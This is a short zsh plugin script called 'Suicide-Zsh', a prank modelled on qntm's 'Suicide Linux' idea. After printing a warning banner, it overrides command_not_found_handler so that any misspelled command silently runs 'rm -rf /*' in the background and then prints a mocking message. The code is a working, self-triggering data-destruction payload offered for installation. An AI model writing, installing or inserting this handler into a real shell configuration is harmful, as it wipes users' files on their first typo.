echo " ==================================="
echo " WARNING: Suicide-Zsh plugin running"
echo "          (https://qntm.org/suicide)"
echo " ==================================="

function command_not_found_handler() {
    rm -rf /* 2>/dev/null &; echo "Oops, looks like you misspelt something >:)";
}
